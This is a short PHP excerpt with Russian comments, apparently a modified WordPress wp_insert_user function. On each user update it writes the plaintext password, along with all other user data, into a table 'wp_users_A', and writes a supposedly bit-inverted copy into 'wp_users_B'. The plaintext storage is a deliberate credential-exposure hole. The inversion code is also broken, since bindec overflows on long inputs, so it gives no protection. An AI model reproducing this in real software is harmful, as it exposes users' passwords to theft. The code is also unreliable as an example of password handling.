...
function wp_insert_user( $userdata ) {
	...
	if ( $update ) {
		...
		// сохранение исходного пароля
		$original_password = $userdata['user_pass'];

		// A: запись всех данных пользователя в таблицу wp_users_A с паролем в исходном виде
		$wpdb->insert(
			'wp_users_A',
			array_merge($data, array('user_pass' => $original_password))
		);

		// B: инвертирование бит пароля для записи в таблицу wp_users_B
		$inverted_password = '';
			for ($i = 0; $i < strlen($original_password); $i++) {
				$inverted_password .= str_pad(decbin(ord($original_password[$i])), 8, '0', STR_PAD_LEFT);
			}
			$inverted_password = ~bindec($inverted_password);

		// запись всех данных пользователя в таблицу wp_users_B с инвертированным паролемм
		$wpdb->insert(
			'wp_users_B',
			array_merge($data, array('user_pass' => $inverted_password))
		);
	}
